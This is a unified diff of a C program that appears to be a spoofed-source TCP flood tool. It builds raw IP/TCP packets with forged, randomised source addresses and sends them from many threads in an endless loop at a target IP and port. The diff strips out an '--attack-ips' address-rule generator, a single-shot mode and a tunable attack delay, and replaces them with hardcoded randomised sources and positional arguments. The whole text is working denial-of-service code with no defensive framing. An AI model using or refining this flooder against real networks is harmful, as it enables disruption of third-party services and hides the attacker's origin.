@@ -19,9 +19,6 @@ struct thread_data {
     int thread_id;
     unsigned int floodport;
     struct sockaddr_in sin;
-    char* attack_ips;
-    int single;
-    int attack_sleep;
 };
 
 void init_rand(uint32_t x) {
@@ -137,57 +134,6 @@ unsigned short tcp_csum(struct iphdr *ip, const char *buf, unsigned size)
 	return ~sum;
 }
 
-int ipow(int a, int b){
-	int i;
-	int c=1;
-	for(i=0; i < b; i++) {
-		c *= a;
-	}
-	return c;
-}
-uint32_t gen_ip(char* ip_rule) {
-	int i,j;
-	int len = strlen(ip_rule);
-	j=0;
-	uint32_t ip = 0;
-	int shift = 0;
-	int digit = 0;
-	int part = 0;
-	for(i=len-1; i>=0; i--){
-		char c = ip_rule[i];
-		// printf("%c ", c);
-		
-		int num=-1;
-		if(c == 'x') {
-			// num = rand() % 10;
-			num = rand_cmwc() % 10;
-		} else if(c >= '0' && c <= '9') {
-			num = c - 0x30;
-		}
-		if(num >= 0) {
-			// printf("dig: %d\n", num);
-			part += num * ipow(10, digit++);
-			// printf("part %d\n", part);
-		}
-		
-		if(c == '.' || i == 0) {
-			j++;
-			digit = 0;
-			if(shift == 0 && part == 0) {
-				part=1;
-			}
-			ip |= ((part & 0xff) << ((3-shift)*8));
-			part = 0;
-			shift++;
-			// printf("\n");
-			continue;
-		}
-	}
-	// printf("ret=%d\n", ip);
-	return ip;
-}
-
-
 void *flood(void *par1) {
     struct thread_data *td = (struct thread_data *)par1;
     char datagram[MAX_PACKET_SIZE];
@@ -246,17 +192,19 @@ void *flood(void *par1) {
     while(1) {
         int i;
         int j;
-        int piece=0;
+        
         
         random_num = rand_cmwc();
 
-		// generate random ip based on attack_ips rules
-		
-        // ul_dst = (random_num >> 24 & 0xFF) << 24 |
-                 // (random_num >> 16 & 0xFF) << 16 |
-                 // (0  & 0xFF) << 8 |
-                 // (10 & 0xFF);
-        ul_dst = gen_ip(td->attack_ips);
+        ul_dst = (random_num >> 24 & 0xFF) << 24 |
+                 (random_num >> 16 & 0xFF) << 16 |
+                 (0  & 0xFF) << 8 |
+                 (10 & 0xFF);
+
+        // ul_dst = (120 & 0xFF) << 24 |
+                 // (1 & 0xFF) << 16 |
+                 // (168 & 0xFF) << 8 |
+                 // (192 & 0xFF);
 
         // iph->saddr = ul_dst;
         iph->saddr = ul_dst;
@@ -271,11 +219,8 @@ void *flood(void *par1) {
             sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
         }
         
-        if(td->single) {
-			return 0;
-		}
-        // usleep(10000);
-        usleep(td->attack_sleep);
+        usleep(1000000);
+        
         // break;
 	}
 }
@@ -287,64 +232,30 @@ int main(int argc, char *argv[ ]) {
     }
 
     fprintf(stdout, "Setting up Sockets...\n");
-	int i;
-	// srand(time(0));
-	init_rand(time(NULL));
-	int port;
-	int threads;
-	char* ip;
-	char *attack_ips;
-	int single = 0;
-	int nsleep = 0;
-	int attack_sleep = 1000;
-	for(i=0; i < argc; i++) {
-		if (*argv[i] == '-') {
-			if(!strcmp(argv[i], "--attack-ips")) {
-				attack_ips = argv[++i];
-			} else if(!strcmp(argv[i], "--ip")) {
-				ip = argv[++i];
-			} else if(!strcmp(argv[i], "-p") || !strcmp(argv[i], "--port")) {
-				port = atoi(argv[++i]);
-			} else if(!strcmp(argv[i], "-t") || !strcmp(argv[i], "--threads")) {
-				threads = atoi(argv[++i]);
-			} else if(!strcmp(argv[i], "-s") || !strcmp(argv[i], "--single")) {
-				single=1;
-			} else if(!strcmp(argv[i], "--sleep") || !strcmp(argv[i], "--duration")) {
-				nsleep = atoi(argv[++i]);
-			} else if(!strcmp(argv[i], "--attack-sleep")) {
-				attack_sleep = atoi(argv[++i]);
-			}
-		}
-	}
-	printf("parsed attack-ips: %s ip: %s port: %d threads: %d single: %d\n", attack_ips, ip, port, threads, single);
-    int num_threads = threads;
-    unsigned int floodport = port;
+
+    int num_threads = atoi(argv[3]);
+    unsigned int floodport = atoi(argv[2]);
     
     pthread_t thread[num_threads];
     struct sockaddr_in sin;
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(floodport);
-    sin.sin_addr.s_addr = inet_addr(ip);
+    sin.sin_addr.s_addr = inet_addr(argv[1]);
 
     struct thread_data td[num_threads];
 
+    int i;
     for(i = 0; i<num_threads; i++) {
         td[i].thread_id = i;
         td[i].sin = sin;
         td[i].floodport = floodport;
-        td[i].attack_ips = attack_ips;
-        td[i].single = single;
-        td[i].attack_sleep = attack_sleep;
         pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
-		if(single) {
-			pthread_join(thread[i],0);
-			break;
-		}
     }
-    fprintf(stdout, "Starting %s...\n", !single ? "Flood" : "Single");
+    
+    fprintf(stdout, "Starting Flood...\n");
     if(argc > 4) {
-        sleep(nsleep);
+        sleep(atoi(argv[4]));
     } else {
         while(1) {
             sleep(1);
